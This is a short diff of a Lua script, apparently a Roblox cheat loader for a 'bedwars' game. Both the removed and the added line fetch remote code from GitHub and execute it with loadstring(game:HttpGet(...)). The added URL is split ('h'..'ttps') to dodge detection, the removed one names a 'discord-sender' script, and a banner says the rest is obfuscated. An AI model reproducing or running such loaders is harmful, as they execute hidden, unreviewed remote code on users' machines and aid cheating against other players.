@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ideaphoton/rbxscripts/main/initialises/pure/discord-sender.lua", true))()
+loadstring(game:HttpGet("h".."ttps://raw.githubusercontent.com/railme37509124/bedwars/main/promaster.lua", true))()
 for i =1, getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH do
 ([[
                      		   This script was obfuscated using ActualShitFuscator.
